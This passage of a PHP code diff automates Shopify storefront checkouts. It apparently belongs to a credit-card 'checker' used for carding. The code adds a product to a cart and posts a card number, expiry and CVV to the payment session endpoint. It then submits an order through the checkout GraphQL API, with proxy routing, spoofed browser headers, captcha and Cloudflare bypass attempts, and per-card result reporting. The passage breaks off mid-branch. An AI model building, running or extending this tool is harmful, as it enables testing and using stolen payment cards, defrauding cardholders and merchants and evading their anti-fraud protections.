+    } catch (Exception $e) {
+        $err = $e->getMessage();
+        $result_data = [
+            'Response' => $err,
+        ];
+        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+    }
+
+if (empty($minPriceProductId)) {
+    $err = 'Product id is empty';
+    $result_data = [
+        'Response' => $err,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+    exit;
+}
+
+$urlbase = $site1;
+$domain = parse_url($urlbase, PHP_URL_HOST); 
+$cookie = 'cookie_'.uniqid('', true).'.txt';
+$GLOBALS['__cookie_file'] = $cookie;
+$prodid = $minPriceProductId;
+cart:
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
+apply_proxy_if_used($ch, $urlbase);
+apply_common_timeouts($ch);
+
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
+curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+curl_setopt($ch, CURLOPT_HEADER, true);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language: en-US,en;q=0.9',
+    'priority: u=0, i',
+    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+    'sec-ch-ua-mobile: ?0',
+    'sec-ch-ua-platform: "Windows"',
+    'sec-fetch-dest: document',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-site: none',
+    'sec-fetch-user: ?1',
+    'upgrade-insecure-requests: 1',
+    'user-agent: '.flow_user_agent(),
+]);
+
+$headers = [];
+curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
+    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
+    $name = trim($name);
+    $value = trim($value);
+
+    // Save the 'Location' header
+    if (strtolower($name) === 'location') {
+        $headers['Location'] = $value;
+    }
+
+    return strlen($headerLine);
+});
+
+$response = curl_exec($ch);
+
+if (curl_errno($ch)) {
+    curl_close($ch); // Always close the previous handle before retrying
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto cart; // Retry the entire operation
+    } else {
+        $err = 'Error in 1st Req => ' . curl_error($ch);
+        $result_data = [
+            'Response' => $err,
+            'Price' => $minPrice,
+        ];
+        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+    }
+} else {
+    file_put_contents('php.php', $response );
+    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
+    // Captcha handling: if page shows captcha, attempt a header-skip once
+    if (CaptchaSolver::requiresCaptcha($response)) {
+        $skip = CaptchaSolver::tryHeaderSkip($finalUrl ?: ($urlbase.'/cart/'.$prodid.':1'), $cookie);
+        if ($skip['success']) {
+            $response = $skip['response'];
+        }
+    }
+    $web_build_id = find_between($response, 'web_build_id&quot;:&quot;', '&quot;');
+    if (empty($web_build_id)) {
+        // Fallback to old hardcoded value if dynamic extraction fails
+        $web_build_id = 'db0237b7310293c9fb41cbfd6a9f8683dfa53fe0'; 
+    }
+    $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
+
+    if (empty($web_build_id) || empty($x_checkout_one_session_token)) {
+        if ($retryCount < $maxRetries) {
+            $retryCount++;
+            curl_close($ch); // Close current curl handle before retrying
+            goto cart; // Retry the entire operation
+        } else {
+            $err = "Cloudflare Bypass Failed or Session token is empty";
+            $result_data = [
+                'Response' => $err,
+                'Price'=> $minPrice,
+            ];
+            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+        }
+    }
+}
+
+$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
+if (empty($queue_token)) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto cart; // Retry the entire operation
+    } else {
+    $err = 'Queue Token is Empty';
+    $result_data = [
+        'Response' => $err,
+        'Price'=> $minPrice,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+}
+}
+
+$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
+if (empty($stable_id)) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto cart; // Retry the entire operation
+    } else {
+    $err = 'Stable id is empty';
+    $result_data = [
+        'Response' => $err,
+        'Price'=> $minPrice,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+}
+}
+$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
+if (empty($paymentMethodIdentifier)) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto cart; // Retry the entire operation
+    } else {
+    $err = 'Payment Method Identifier is empty';
+    $result_data = [
+        'Response' => $err,
+        'Price'=> $minPrice,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+}
+}
+$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
+$checkoutToken = '';
+if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
+    $checkoutToken = $matches[1];
+}
+
+card:
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
+apply_proxy_if_used($ch, 'https://deposit.shopifycs.com/sessions');
+apply_common_timeouts($ch);
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'accept: application/json',
+    'accept-language: en-US,en;q=0.9',
+    'content-type: application/json',
+    'origin: https://checkout.shopifycs.com',
+    'priority: u=1, i',
+    'referer: https://checkout.shopifycs.com/',
+    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+    'sec-ch-ua-mobile: ?0',
+    'sec-ch-ua-platform: "Windows"',
+    'sec-fetch-dest: empty',
+    'sec-fetch-mode: cors',
+    'sec-fetch-site: same-site',
+    'user-agent: '.flow_user_agent(),
+]);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"'.$firstname.' '.$lastname.'"},"payment_session_scope":"'.$domain.'"}');
+$response2 = curl_exec($ch);
+$curlErr = curl_errno($ch);
+$curlErrMsg = curl_error($ch);
+curl_close($ch);
+if ($curlErr) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto card; // Retry the entire operation
+    } else {
+    $err = 'cURL error: ' . $curlErrMsg;
+    $result_data = [
+        'Response' => $err,
+        'Price'=> $minPrice,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+}
+}
+$response2js = json_decode($response2, true);
+$cctoken = $response2js['id'];
+if (empty($cctoken)) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto card; // Retry the entire operation
+    } else {
+    $err  = 'Card Token is empty';
+    $result_data = [
+        'Response' => $err,
+        'Price'=> $minPrice,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+     echo $response2;
+    exit;
+}
+}
+
+proposal:
+sleep(runtime_cfg()['sleep']);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
+apply_proxy_if_used($ch, $urlbase);
+apply_common_timeouts($ch);
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
+ curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'accept: application/json',
+    'accept-language: en-GB',
+    'content-type: application/json',
+    'origin: ' . $urlbase,
+    'priority: u=1, i',
+    'referer: ' . $urlbase . '/',
+    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+    'sec-ch-ua-mobile: ?0',
+    'sec-ch-ua-platform: "Windows"',
+    'sec-fetch-dest: empty',
+    'sec-fetch-mode: cors',
+    'sec-fetch-site: same-origin',
+    'shopify-checkout-client: checkout-web/1.0',
+    'user-agent: '.flow_user_agent(),
+    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
+    'x-checkout-web-build-id: ' . $web_build_id,
+    'x-checkout-web-deploy-stage: production',
+    'x-checkout-web-server-handling: fast',
+    'x-checkout-web-server-rendering: no',
+    'x-checkout-web-source-id: ' . $checkoutToken,
+    'Expect:',
+]);
+$proposalQuery = extractOperationQueryFromFile('jsonp.php', 'Proposal');
+$proposalPayload = [
+        'query' => $proposalQuery,
+        'variables' => [
+                'sessionInput' => [
+                    'sessionToken' => $x_checkout_one_session_token
+                ],
+                'queueToken' => $queue_token,
+            'discounts' => [
+                'lines' => [],
+                'acceptUnexpectedDiscounts' => true
+            ],
+            'delivery' => [
+                'deliveryLines' => [
+                    [
+                        'destination' => [
+                            'partialStreetAddress' => [
+                                    'address1' => $address,
+                                    'address2' => '',
+                                    'city' => $city_us,
+                                    'countryCode' => 'US',
+                                    'postalCode' => $zip_us,
+                                    'firstName' => $firstname,
+                                    'lastName' => $lastname,
+                                    'zoneCode' => $state_us,
+                                    'phone' => $phone,
+                                    'oneTimeUse' => false,
+                                    'coordinates' => [
+                                        'latitude' => $lat,
+                                        'longitude' => $lon
+                                ]
+                            ]
+                        ],
+                        'selectedDeliveryStrategy' => [
+                            'deliveryStrategyMatchingConditions' => [
+                                'estimatedTimeInTransit' => [
+                                    'any' => true
+                                ],
+                                'shipments' => [
+                                    'any' => true
+                                ]
+                            ],
+                            'options' => new stdClass()
+                        ],
+                        'targetMerchandiseLines' => [
+                            'any' => true
+                        ],
+                        'deliveryMethodTypes' => [
+                            'SHIPPING',
+                            'LOCAL'
+                        ],
+                        'expectedTotalPrice' => [
+                            'any' => true
+                        ],
+                        'destinationChanged' => true
+                    ]
+                ],
+                'noDeliveryRequired' => [],
+                'useProgressiveRates' => false,
+                'prefetchShippingRatesStrategy' => null,
+                'supportsSplitShipping' => true
+            ],
+            'deliveryExpectations' => [
+                'deliveryExpectationLines' => []
+            ],
+            'merchandise' => [
+                'merchandiseLines' => [
+                    [
+                        'stableId' => $stable_id,
+                        'merchandise' => [
+                            'productVariantReference' => [
+                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
+                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
+                                'properties' => [
+                                    [
+                                        'name' => '_minimum_allowed',
+                                        'value' => [
+                                            'string' => ''
+                                        ]
+                                    ]
+                                ],
+                                'sellingPlanId' => null,
+                                'sellingPlanDigest' => null
+                            ]
+                        ],
+                        'quantity' => [
+                            'items' => [
+                                'value' => 1
+                            ]
+                        ],
+                        'expectedTotalPrice' => [
+                            'value' => [
+                                'amount' => $minPrice,
+                                'currencyCode' => 'USD'
+                            ]
+                        ],
+                        'lineComponentsSource' => null,
+                        'lineComponents' => []
+                    ]
+                ]
+            ],
+            'payment' => [
+                'totalAmount' => [
+                    'any' => true
+                ],
+                'paymentLines' => [],
+                'billingAddress' => [
+                    'streetAddress' => [
+                        'address1' => $address,
+                        'address2' => '',
+                        'city' => $city_us,
+                        'countryCode' => 'US',
+                        'postalCode' => $zip_us,
+                        'firstName' => $firstname,
+                        'lastName' => $lastname,
+                        'zoneCode' => $state_us,
+                        'phone' => $phone,
+                    ]
+                ]
+            ],
+            'buyerIdentity' => [
+                'customer' => [
+                    'presentmentCurrency' => 'USD',
+                    'countryCode' => 'US'
+                ],
+                'email' => $email,
+                'emailChanged' => false,
+                'phoneCountryCode' => 'US',
+                'marketingConsent' => [],
+                'shopPayOptInPhone' => [
+                    'countryCode' => 'US'
+                ],
+                'rememberMe' => false
+            ],
+            'tip' => [
+                'tipLines' => []
+            ],
+            'taxes' => [
+                'proposedAllocations' => null,
+                'proposedTotalAmount' => null,
+                'proposedTotalIncludedAmount' => [
+                    'value' => [
+                        'amount' => '0',
+                        'currencyCode' => 'USD'
+                    ]
+                ],
+                'proposedMixedStateTotalAmount' => null,
+                'proposedExemptions' => []
+            ],
+            'note' => [
+                'message' => null,
+                'customAttributes' => []
+            ],
+            'localizationExtension' => [
+                'fields' => []
+            ],
+            'nonNegotiableTerms' => null,
+            'scriptFingerprint' => [
+                'signature' => null,
+                'signatureUuid' => null,
+                'lineItemScriptChanges' => [],
+                'paymentScriptChanges' => [],
+                'shippingScriptChanges' => []
+            ],
+            'optionalDuties' => [
+                'buyerRefusesDuties' => false
+            ]
+        ],
+        'operationName' => 'Proposal'
+];
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($proposalPayload));
+
+$response3 = curl_exec($ch);
+$curlErr = curl_errno($ch);
+$curlErrMsg = curl_error($ch);
+curl_close($ch);
+// echo "<li>step_3: $response3<li>";
+if ($curlErr) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto proposal; // Retry the entire operation
+    } else {
+    $err = 'cURL error: ' . $curlErrMsg;
+    $result_data = [
+        'Response' => $err,
+        'Price'=> $minPrice,
+    ];
+    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+}
+}
+
+
+$decoded = json_decode($response3);
+
+// Log response for debugging
+if (isset($_GET['debug'])) {
+    file_put_contents('proposal_debug.json', json_encode($decoded, JSON_PRETTY_PRINT));
+}
+
+$gateway = '';
+$paymentMethodName = 'null';
+
+if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
+    $firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;
+    
+    if (empty($firstStrategy)) {
+        if ($retryCount < $maxRetries) {
+            $retryCount++;
+            goto proposal;
+        } else {
+            $err = 'Shipping info is empty';
+            $result_data = [
+                'Response' => $err,
+                'Price' => $minPrice,
+                'Gateway' => $gateway,
+            ];
+            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+        }
+    } else {
+        // Get payment method name
+        if (!empty($firstStrategy->payment->availablePaymentLines)) {
+            foreach ($firstStrategy->payment->availablePaymentLines as $paymentLine) {
+                if (isset($paymentLine->paymentMethod->name)) {
+                    $paymentMethodName = $paymentLine->paymentMethod->name;
+                    break;
+                }
+            }
+        }
+    }
+} elseif (isset($decoded->errors)) {
+    // Handle GraphQL errors
+    $errorMsg = isset($decoded->errors[0]->message) ? $decoded->errors[0]->message : 'GraphQL error';
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto proposal;
+    } else {
+        $err = 'API Error: ' . $errorMsg;
+        $result_data = [
+            'Response' => $err,
+            'Price' => $minPrice,
+        ];
+        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+    }
+}
+
+$gateway = $paymentMethodName;
+// Fallback/augment with detector from full response
+if (empty($gateway) || $gateway === 'null') {
+    $gateway = GatewayDetector::detect($response3, $checkouturl);
+}
+
+// Try to get handle from multiple possible locations
+$handle = '';
+if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
+    $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
+} elseif (isset($firstStrategy->delivery->deliveryLines[0]->deliveryStrategy->handle)) {
+    $handle = $firstStrategy->delivery->deliveryLines[0]->deliveryStrategy->handle;
+} elseif (isset($firstStrategy->delivery->selectedDeliveryOption->handle)) {
+    $handle = $firstStrategy->delivery->selectedDeliveryOption->handle;
+}
+
+if (empty($handle)) {
+    // Try to find first available delivery strategy
+    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies) && 
+        is_array($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies) &&
+        count($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies) > 0) {
+        foreach ($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies as $strategy) {
+            if (isset($strategy->handle) && !empty($strategy->handle)) {
+                $handle = $strategy->handle;
+                break;
+            }
+        }
+    }
+}
+
+if (empty($handle)) {
+    if ($retryCount < $maxRetries) {
+        $retryCount++;
+        goto proposal;
+    } else {
+        $err = 'Handle is empty - No delivery strategies available';
+        $result_data = [
+            'Response' => $err,
+            'Price'=> $minPrice,
+            'Gateway' => $gateway,
+            'Debug' => 'Check if site has delivery methods configured'
+        ];
+        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+    }
+}
+    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
+        $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
+    }
+    if (empty($delamount)) {
+        if ($retryCount < $maxRetries) {
+            $retryCount++;
+            goto proposal;
+        } else {
+            $err = 'Delivery rates are empty';
+            $result_data = [
+                'Response' => $err,
+                'Price'=> $minPrice,
+                'Gateway' => $gateway,
+            ];
+            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+        }
+    }
+    if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
+        $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
+    }
+    elseif (empty($tax)) {
+        if ($retryCount < $maxRetries) {
+                $retryCount++;
+                goto proposal;
+        }
+        $err = 'Tax amount is empty';
+        $result_data = [
+            'Response' => $err,
+            'Price'=> $minPrice,
+            'Gateway' => $gateway,
+        ];
+        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
+        exit;
+    }
+    $currencycode = $firstStrategy->tax->totalTaxAmount->value->currencyCode;
+    $totalamt = $firstStrategy->runningTotal->value->amount;
+  //  $resultg = json_encode([
+  //  'Response' => 'Success',
+    //'Details' => [
+    //    'Price' => $minPrice,
+    //    'Shipping' => $delamount,
+    //    'Tax' => $tax,
+    //    'Total' => $totalamt,
+     //   'Currency' => $currencycode,
+      //  'Gateway' => $gateway,
+ //   ],
+//]);
+//    echo $resultg;
+if ($totalamt == '10.98' && $currencycode == 'USD') {
+    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
+                'variables' => [
+                    'input' => [
+                        'sessionInput' => [
+                            'sessionToken' => $x_checkout_one_session_token
+                        ],
+                        'queueToken' => $queue_token,
+                        'discounts' => [
+                            'lines' => [],
+                            'acceptUnexpectedDiscounts' => true
+                        ],
+                        'delivery' => [
+                            'deliveryLines' => [
+                                [
+                                    'selectedDeliveryStrategy' => [
+                                        'deliveryStrategyMatchingConditions' => [
+                                            'estimatedTimeInTransit' => [
+                                                'any' => true
+                                            ],
+                                            'shipments' => [
+                                                'any' => true
+                                            ]
+                                        ],
+                                        'options' => new stdClass()
+                                    ],
+                                    'targetMerchandiseLines' => [
+                                        'lines' => [
+                                            [
+                                                'stableId' => $stable_id
+                                            ]
+                                        ]
+                                    ],
+                                    'deliveryMethodTypes' => [
+                                        'NONE'
+                                    ],
+                                    'expectedTotalPrice' => [
+                                        'any' => true
+                                    ],
+                                    'destinationChanged' => true
+                                ]
+                            ],
+                            'noDeliveryRequired' => [],
+                            'useProgressiveRates' => false,
+                            'prefetchShippingRatesStrategy' => null,
+                            'supportsSplitShipping' => true
+                        ],
+                        'deliveryExpectations' => [
+                            'deliveryExpectationLines' => []
+                        ],
+                        'merchandise' => [
+                            'merchandiseLines' => [
+                                [
+                                    'stableId' => $stable_id,
+                                    'merchandise' => [
+                                        'productVariantReference' => [
+                                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
+                                            'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
+                                            'properties' => [],
+                                            'sellingPlanId' => null,
+                                            'sellingPlanDigest' => null
+                                        ]
+                                    ],
+                                    'quantity' => [
+                                        'items' => [
+                                            'value' => 1
+                                        ]
+                                    ],
+                                    'expectedTotalPrice' => [
+                                        'value' => [
+                                            'amount' => $minPrice,
+                                            'currencyCode' => 'USD'
+                                        ]
+                                    ],
+                                    'lineComponentsSource' => null,
+                                    'lineComponents' => []
+                                ]
+                            ]
+                        ],
+                        'payment' => [
+                            'totalAmount' => [
+                                'any' => true
+                            ],
+                            'paymentLines' => [
+                                [
+                                    'paymentMethod' => [
+                                        'directPaymentMethod' => [
+                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
+                                            'sessionId' => $cctoken,
+                                            'billingAddress' => [
+                                                'streetAddress' => [
+                                                    'address1' => $address,
+                                                    'address2' => '',
+                                                    'city' => $city_us,
+                                                    'countryCode' => 'US',
+                                                    'postalCode' => $zip_us,
+                                                    'firstName' => $firstname,
+                                                    'lastName' => $lastname,
+                                                    'zoneCode' => $state_us,
+                                                    'phone' => ''
+                                                ]
+                                            ],
+                                            'cardSource' => null
+                                        ],
+                                        'giftCardPaymentMethod' => null,
+                                        'redeemablePaymentMethod' => null,
+                                        'walletPaymentMethod' => null,
+                                        'walletsPlatformPaymentMethod' => null,
+                                        'localPaymentMethod' => null,
+                                        'paymentOnDeliveryMethod' => null,
+                                        'paymentOnDeliveryMethod2' => null,
+                                        'manualPaymentMethod' => null,
+                                        'customPaymentMethod' => null,
+                                        'offsitePaymentMethod' => null,
+                                        'customOnsitePaymentMethod' => null,
+                                        'deferredPaymentMethod' => null,
+                                        'customerCreditCardPaymentMethod' => null,
+                                        'paypalBillingAgreementPaymentMethod' => null
+                                    ],
+                                    'amount' => [
+                                        'value' => [
+                                            'amount' => $totalamt,
+                                            'currencyCode' => 'USD'
+                                        ]
+                                    ],
+                                    'dueAt' => null
+                                ]
+                            ],
+                            'billingAddress' => [
+                                'streetAddress' => [
+                                    'address1' => $address,
+                                    'address2' => '',
+                                    'city' => $city_us,
+                                    'countryCode' => 'US',
+                                    'postalCode' => $zip_us,
+                                    'firstName' => $firstname,
+                                    'lastName' => $lastname,
+                                    'zoneCode' => $state_us,
+                                    'phone' => ''
+                                ]
+                            ]
+                        ],
+                        'buyerIdentity' => [
+                            'customer' => [
+                                'presentmentCurrency' => 'US',
+                                'countryCode' => 'US'
+                            ],
+                            'email' => $email,
+                            'emailChanged' => false,
+                            'phoneCountryCode' => 'US',
+                            'marketingConsent' => [],
+                            'shopPayOptInPhone' => [
+                                'countryCode' => 'US'
+                            ],
+                            'rememberMe' => false
+                        ],
+                        'tip' => [
+                            'tipLines' => []
+                        ],
+                        'taxes' => [
+                            'proposedAllocations' => null,
+                            'proposedTotalAmount' => [
+                                'value' => [
+                                    'amount' => $tax,
+                                    'currencyCode' => 'USD'
+                                ]
+                            ],
+                            'proposedTotalIncludedAmount' => null,
+                            'proposedMixedStateTotalAmount' => null,
+                            'proposedExemptions' => []
+                        ],
+                        'note' => [
+                            'message' => null,
+                            'customAttributes' => []
+                        ],
+                        'localizationExtension' => [
+                            'fields' => []
+                        ],
+                        'nonNegotiableTerms' => null,
+                        'scriptFingerprint' => [
+                            'signature' => null,
+                            'signatureUuid' => null,
+                            'lineItemScriptChanges' => [],
+                            'paymentScriptChanges' => [],
+                            'shippingScriptChanges' => []
+                        ],
+                        'optionalDuties' => [
+                            'buyerRefusesDuties' => false
+                        ]
+                    ],
+                    'attemptToken' => $checkoutToken,
+                    'metafields' => [],
+                    'analytics' => [
+                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
+                        'pageId' => $stable_id
+                    ]
+                ],
+                'operationName' => 'SubmitForCompletion'
+            ]);
+}
+elseif ($currencycode == 'USD') {
+    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
+            'variables' => [
+                'input' => [
+                    'sessionInput' => [
+                        'sessionToken' => $x_checkout_one_session_token
+                    ],
+                    'queueToken' => $queue_token,
+                    'discounts' => [
+                        'lines' => [],
+                        'acceptUnexpectedDiscounts' => true
+                    ],
+                    'delivery' => [
+                        'deliveryLines' => [
+                            [
+                                'destination' => [
+                                    'streetAddress' => [
+                                        'address1' => $address,
+                                        'address2' => '',
+                                        'city' => $city_us,
+                                        'countryCode' => 'US',
+                                        'postalCode' => $zip_us,
+                                        'firstName' => $firstname,
+                                        'lastName' => $lastname,
+                                        'zoneCode' => $state_us,
+                                        'phone' => $phone,
+                                        'oneTimeUse' => false,
+                                        'coordinates' => [
+                                            'latitude' => $lat,
+                                            'longitude' => $lon
+                                        ]
+                                    ]
+                                ],
+                                'selectedDeliveryStrategy' => [
+                                    'deliveryStrategyByHandle' => [
+                                        'handle' => $handle,
+                                        'customDeliveryRate' => false
+                                    ],
+                                    'options' => new stdClass()
+                                ],
+                                'targetMerchandiseLines' => [
+                                    'lines' => [
+                                        [
+                                            'stableId' => $stable_id
+                                        ]
+                                    ]
+                                ],
+                                'deliveryMethodTypes' => [
+                                    'SHIPPING',
+                                    'LOCAL'
+                                ],
+                                'expectedTotalPrice' => [
+                                    'value' => [
+                                        'amount' => $delamount,
+                                        'currencyCode' => 'USD'
+                                    ]
+                                ],
+                                'destinationChanged' => false
+                            ]
+                        ],
+                        'noDeliveryRequired' => [],
+                        'useProgressiveRates' => false,
+                        'prefetchShippingRatesStrategy' => null,
+                        'supportsSplitShipping' => true
+                    ],
+                    'deliveryExpectations' => [
+                        'deliveryExpectationLines' => []
+                    ],
+                    'merchandise' => [
+                        'merchandiseLines' => [
+                            [
+                                'stableId' => $stable_id,
+                                'merchandise' => [
+                                    'productVariantReference' => [
+                                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
+                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
+                                        'properties' => [],
+                                        'sellingPlanId' => null,
+                                        'sellingPlanDigest' => null
+                                    ]
+                                ],
+                                'quantity' => [
+                                    'items' => [
+                                        'value' => 1
+                                    ]
+                                ],
+                                'expectedTotalPrice' => [
+                                    'value' => [
+                                        'amount' => $minPrice,
+                                        'currencyCode' => 'USD'
+                                    ]
+                                ],
+                                'lineComponentsSource' => null,
+                                'lineComponents' => []
+                            ]
+                        ]
+                    ],
+                    'payment' => [
+                        'totalAmount' => [
+                            'any' => true
+                        ],
+                        'paymentLines' => [
+                            [
+                                'paymentMethod' => [
+                                    'directPaymentMethod' => [
+                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
+                                        'sessionId' => $cctoken,
+                                        'billingAddress' => [
+                                            'streetAddress' => [
+                                                'address1' => $address,
+                                                'address2' => '',
+                                                'city' => $city_us,
+                                                'countryCode' => 'US',
+                                                'postalCode' => $zip_us,
+                                                'firstName' => $firstname,
+                                                'lastName' => $lastname,
+                                                'zoneCode' => $state_us,
+                                                'phone' => $phone
+                                            ]
+                                        ],
+                                        'cardSource' => null
+                                    ],
+                                    'giftCardPaymentMethod' => null,
+                                    'redeemablePaymentMethod' => null,
+                                    'walletPaymentMethod' => null,
+                                    'walletsPlatformPaymentMethod' => null,
+                                    'localPaymentMethod' => null,
+                                    'paymentOnDeliveryMethod' => null,
+                                    'paymentOnDeliveryMethod2' => null,
+                                    'manualPaymentMethod' => null,
+                                    'customPaymentMethod' => null,
+                                    'offsitePaymentMethod' => null,
+                                    'customOnsitePaymentMethod' => null,
+                                    'deferredPaymentMethod' => null,
+                                    'customerCreditCardPaymentMethod' => null,
+                                    'paypalBillingAgreementPaymentMethod' => null
+                                ],
+                                'amount' => [
+                                    'value' => [
+                                        'amount' => $totalamt,
+                                        'currencyCode' => 'USD'
+                                    ]
+                                ],
+                                'dueAt' => null
+                            ]
+                        ],
+                        'billingAddress' => [
+                            'streetAddress' => [
+                                'address1' => $address,
+                                'address2' => '',
+                                'city' => $city_us,
+                                'countryCode' => 'US',
+                                'postalCode' => $zip_us,
+                                'firstName' => $firstname,
+                                'lastName' => $lastname,
+                                'zoneCode' => $state_us,
+                                'phone' => $phone
+                            ]
+                        ]
+                    ],
+                    'buyerIdentity' => [
+                        'customer' => [
+                            'presentmentCurrency' => 'USD',
+                            'countryCode' => 'US'
+                        ],
+                        'email' => $email,
+                        'emailChanged' => false,
+                        'phoneCountryCode' => 'US',
+                        'marketingConsent' => [],
+                        'shopPayOptInPhone' => [
+                            'countryCode' => 'US'
+                        ]
+                    ],
+                    'tip' => [
+                        'tipLines' => []
+                    ],
+                    'taxes' => [
+                        'proposedAllocations' => null,
+                        'proposedTotalAmount' => [
+                            'value' => [
+                                'amount' => $tax,
+                                'currencyCode' => 'USD'
+                            ]
+                        ],
+                        'proposedTotalIncludedAmount' => null,
+                        'proposedMixedStateTotalAmount' => null,
+                        'proposedExemptions' => []
+                    ],
+                    'note' => [
+                        'message' => null,
+                        'customAttributes' => []
+                    ],
+                    'localizationExtension' => [
+                        'fields' => []
+                    ],
+                    'nonNegotiableTerms' => null,
+                    'scriptFingerprint' => [
+                        'signature' => null,
+                        'signatureUuid' => null,
+                        'lineItemScriptChanges' => [],
+                        'paymentScriptChanges' => [],
+                        'shippingScriptChanges' => []
+                    ],
+                    'optionalDuties' => [
+                        'buyerRefusesDuties' => false
+                    ]
+                ],
+                'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
+                'metafields' => [],
+                'analytics' => [
+                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
+                    'pageId' => $stable_id
+                ]
+            ],
+            'operationName' => 'SubmitForCompletion'
+        ]);    
+} 
+elseif ($currencycode == 'NZD') {
